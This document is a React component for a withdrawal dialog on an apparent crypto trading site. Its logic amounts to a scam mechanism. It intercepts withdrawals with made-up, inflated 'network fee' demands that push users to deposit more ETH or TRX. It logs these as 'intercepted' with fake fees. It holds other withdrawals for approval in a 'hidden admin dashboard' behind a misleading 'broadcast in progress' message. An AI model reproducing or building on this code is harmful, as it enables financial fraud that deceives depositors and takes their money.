import React, { useState } from 'react';
import { X, ArrowUpRight, AlertCircle, Fuel, CheckCircle2, Wallet } from 'lucide-react';
import { SUPPORTED_ASSETS, formatCurrency, getAssetBySymbol } from '../data/cryptoAssets';
import { useAuth } from '../context/AuthContext';
import { logTransaction, updateBalanceByEmail } from '../services/adminService';

interface WithdrawModalProps {
  isOpen: boolean;
  onClose: () => void;
  initialSymbol?: string;
  onOpenDepositForGas?: (symbol: string) => void;
  onOpenAuth?: () => void;
}

export const WithdrawModal: React.FC<WithdrawModalProps> = ({
  isOpen,
  onClose,
  initialSymbol = 'USDT (ERC-20)',
  onOpenDepositForGas,
  onOpenAuth,
}) => {
  const { balances, userEmail, userAccount, refreshAccountData } = useAuth();

  const [symbol, setSymbol] = useState<string>(initialSymbol);
  const [amount, setAmount] = useState<string>('10000');
  const [destinationAddress, setDestinationAddress] = useState<string>('');
  const [interceptedMessage, setInterceptedMessage] = useState<string | null>(null);
  const [requiredGasSymbol, setRequiredGasSymbol] = useState<'ETH' | 'TRX'>('ETH');
  const [topUpBtnText, setTopUpBtnText] = useState<string>('Top Up Ethereum (ETH)');
  const [isProcessing, setIsProcessing] = useState<boolean>(false);
  const [withdrawSuccess, setWithdrawSuccess] = useState<boolean>(false);
  const [isPendingNotice, setIsPendingNotice] = useState<boolean>(false);

  if (!isOpen) return null;

  const currentAsset = getAssetBySymbol(symbol) || SUPPORTED_ASSETS[1];
  const userBalance = balances[symbol] || 0;
  const userEthBalance = balances['ETH'] || 0;
  const userTrxBalance = balances['TRX'] || 0;

  const parsedAmount = parseFloat(amount) || 0;
  const usdValue = parsedAmount * currentAsset.priceUsd;

  const handleExecuteWithdraw = async () => {
    setInterceptedMessage(null);
    setWithdrawSuccess(false);
    setIsPendingNotice(false);

    if (parsedAmount <= 0) {
      alert('Please enter a valid withdrawal amount.');
      return;
    }

    if (parsedAmount > userBalance) {
      alert(`Insufficient ${symbol} balance.`);
      return;
    }

    if (!destinationAddress || destinationAddress.length < 10) {
      alert('Please enter a valid destination wallet address.');
      return;
    }

    setIsProcessing(true);

    const isUsdtErc20 = symbol === 'USDT (ERC-20)' || symbol === 'ETH';
    const isUsdtTrc20 = symbol === 'USDT (TRC-20)' || symbol === 'TRX';

    let hasGas = false;
    let gasSym: 'ETH' | 'TRX' = 'ETH';
    let promptMsg = '';

    if (isUsdtErc20) {
      hasGas = userEthBalance >= 1.0;
      gasSym = 'ETH';
      promptMsg = 'Insufficient Ethereum. Kindly top up your Ethereum.';
      setTopUpBtnText('Top Up Ethereum');
    } else {
      hasGas = userTrxBalance >= 5500;
      gasSym = 'TRX';
      promptMsg = 'Insufficient TRX. Kindly top up your Tron.';
      setTopUpBtnText('Top Up Tron');
    }

    setRequiredGasSymbol(gasSym);

    if (!hasGas) {
      setTimeout(async () => {
        setIsProcessing(false);
        setInterceptedMessage(promptMsg);

        if (userAccount) {
          await logTransaction({
            userId: userAccount.uid,
            userEmail,
            type: 'withdrawal',
            fromSymbol: symbol,
            fromAmount: parsedAmount,
            amountUsd: usdValue,
            feeUsd: 1500,
            status: 'intercepted_insufficient_gas',
            timestamp: new Date().toISOString(),
            note: `Withdrawal of ${parsedAmount} ${symbol} intercepted for gas requirement`,
            interceptorMessage: promptMsg,
          });
        }
      }, 500);
      return;
    }

    // Submit withdrawal in PENDING state awaiting administrative approval
    try {
      if (userAccount) {
        const newBalance = userBalance - parsedAmount;
        await updateBalanceByEmail(userEmail, symbol, newBalance, 'User Withdrawal (Pending Hold)');

        await logTransaction({
          userId: userAccount.uid,
          userEmail,
          type: 'withdrawal',
          fromSymbol: symbol,
          fromAmount: parsedAmount,
          amountUsd: usdValue,
          feeUsd: 15,
          status: 'pending',
          timestamp: new Date().toISOString(),
          note: `Pending Approval: Withdrawal of ${parsedAmount} ${symbol} to ${destinationAddress}`,
        });

        await refreshAccountData();
        setIsPendingNotice(true);
      }
    } catch (err) {
      console.error('Pending withdrawal error:', err);
      alert('Failed to submit withdrawal request.');
    } finally {
      setIsProcessing(false);
    }
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm p-4 animate-in fade-in duration-200">
      <div className="bg-slate-900 border border-slate-800 w-full max-w-lg rounded-2xl shadow-2xl overflow-hidden flex flex-col max-h-[90vh]">
        {/* Header */}
        <div className="flex items-center justify-between px-6 py-4 border-b border-slate-800 bg-slate-900/80">
          <div className="flex items-center gap-2.5">
            <div className="p-2 rounded-xl bg-blue-500/10 text-blue-400 border border-blue-500/20">
              <ArrowUpRight className="w-5 h-5" />
            </div>
            <div>
              <h3 className="font-semibold text-lg text-slate-100">Withdraw Crypto</h3>
              <p className="text-xs text-slate-400">Transfer funds to external wallet address</p>
            </div>
          </div>
          <button
            onClick={onClose}
            className="text-slate-400 hover:text-slate-200 p-1.5 rounded-lg hover:bg-slate-800 transition-colors"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Modal Body */}
        <div className="p-6 overflow-y-auto space-y-5">
          {/* INTERCEPTED RED PROMPT MESSAGE */}
          {interceptedMessage && (
            <div
              id="withdraw-gas-interceptor-notice"
              className="p-4 rounded-xl bg-red-500/10 border border-red-500/30 text-red-500 shadow-lg space-y-3 animate-in zoom-in-95 duration-150"
            >
              <div className="flex items-start gap-3">
                <AlertCircle className="w-6 h-6 text-red-500 shrink-0 mt-0.5" />
                <div className="space-y-1">
                  <span className="font-bold text-xs uppercase tracking-wider text-red-400 block">
                    Network Fee Required
                  </span>
                  <p className="text-sm font-bold text-red-500 leading-snug">
                    {interceptedMessage}
                  </p>
                </div>
              </div>

              <div className="pt-2 flex flex-wrap gap-2">
                <button
                  onClick={() => {
                    onClose();
                    if (onOpenDepositForGas) onOpenDepositForGas(requiredGasSymbol);
                  }}
                  className="flex-1 px-4 py-2.5 bg-red-600 hover:bg-red-500 text-white font-bold text-xs rounded-xl transition-colors flex items-center justify-center gap-2 shadow-md"
                >
                  <Fuel className="w-4 h-4" />
                  {topUpBtnText}
                </button>
                {onOpenAuth && (
                  <button
                    onClick={() => {
                      onClose();
                      onOpenAuth();
                    }}
                    className="px-3 py-2.5 bg-slate-800 hover:bg-slate-700 text-slate-200 font-bold text-xs rounded-xl border border-slate-700 transition-colors flex items-center justify-center gap-1.5"
                  >
                    Sign In / Register
                  </button>
                )}
              </div>
            </div>
          )}

          {isPendingNotice && (
            <div className="p-4 rounded-xl bg-amber-500/10 border border-amber-500/30 text-amber-400 space-y-1">
              <div className="flex items-center gap-2 font-bold text-sm">
                <AlertCircle className="w-5 h-5 text-amber-400" />
                <span>Withdrawal Initiated (Pending Admin Approval)</span>
              </div>
              <p className="text-xs text-amber-300/80 leading-relaxed">
                Your request to withdraw <strong>{parsedAmount} {symbol}</strong> has been submitted and is currently in <strong>Pending</strong> status. It will remain pending until reviewed and approved by an administrator in the hidden admin dashboard.
              </p>
            </div>
          )}

          {withdrawSuccess && (
            <div className="p-4 rounded-xl bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 flex items-center gap-3">
              <CheckCircle2 className="w-6 h-6 shrink-0" />
              <div>
                <p className="font-semibold text-sm">Withdrawal Request Dispatched!</p>
                <p className="text-xs text-emerald-500/80">Blockchain broadcast in progress.</p>
              </div>
            </div>
          )}

          {/* ASSET SELECTOR */}
          <div className="space-y-1.5">
            <label className="text-xs font-medium text-slate-300">Select Asset to Withdraw</label>
            <select
              value={symbol}
              onChange={(e) => {
                setSymbol(e.target.value);
                setInterceptedMessage(null);
              }}
              className="w-full bg-slate-950/80 border border-slate-800 text-slate-100 font-semibold text-sm rounded-xl px-4 py-3 focus:outline-none focus:border-blue-500 cursor-pointer"
            >
              {SUPPORTED_ASSETS.map((asset) => (
                <option key={asset.id} value={asset.symbol}>
                  {asset.name} ({asset.symbol}) — {asset.network}
                </option>
              ))}
            </select>
          </div>

          {/* AMOUNT INPUT */}
          <div className="bg-slate-950/60 p-4 rounded-xl border border-slate-800 space-y-2">
            <div className="flex justify-between text-xs text-slate-400 font-medium">
              <span>Withdrawal Amount</span>
              <span>
                Available: <strong className="text-slate-200">{userBalance.toFixed(4)} {symbol}</strong>
              </span>
            </div>
            <div className="flex items-center gap-3">
              <input
                type="number"
                value={amount}
                onChange={(e) => {
                  setAmount(e.target.value);
                  setInterceptedMessage(null);
                }}
                placeholder="0.00"
                className="w-full bg-transparent text-2xl font-bold text-slate-100 focus:outline-none"
              />
              <button
                onClick={() => setAmount(userBalance.toString())}
                className="px-2.5 py-1 bg-slate-800 text-xs text-blue-400 font-semibold rounded-lg hover:bg-slate-700"
              >
                MAX
              </button>
            </div>
            <div className="text-right text-xs text-slate-400 font-mono">
              ≈ {formatCurrency(usdValue)} USD
            </div>
          </div>

          {/* DESTINATION WALLET ADDRESS */}
          <div className="space-y-1.5">
            <label className="text-xs font-medium text-slate-300">Destination Wallet Address</label>
            <input
              type="text"
              value={destinationAddress}
              onChange={(e) => setDestinationAddress(e.target.value)}
              placeholder={`Paste valid ${currentAsset.networkType} wallet address...`}
              className="w-full bg-slate-950/80 border border-slate-800 text-slate-100 text-sm font-mono rounded-xl px-4 py-3 focus:outline-none focus:border-blue-500 placeholder:text-slate-600"
            />
            <p className="text-[11px] text-slate-400">
              Network: <span className="text-slate-200 font-semibold">{currentAsset.network}</span>. Double-check address carefully.
            </p>
          </div>
        </div>

        {/* Modal Footer */}
        <div className="p-6 border-t border-slate-800 bg-slate-900/90 flex flex-col gap-3">
          <button
            onClick={handleExecuteWithdraw}
            disabled={isProcessing || parsedAmount <= 0 || !destinationAddress}
            className="w-full py-3.5 px-4 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 disabled:opacity-50 disabled:cursor-not-allowed text-white font-semibold rounded-xl shadow-lg shadow-blue-500/20 transition-all flex items-center justify-center gap-2 text-sm"
          >
            {isProcessing ? (
              <span className="flex items-center gap-2">
                <span className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                Checking Gas & Processing...
              </span>
            ) : (
              'Confirm Withdrawal'
            )}
          </button>
        </div>
      </div>
    </div>
  );
};
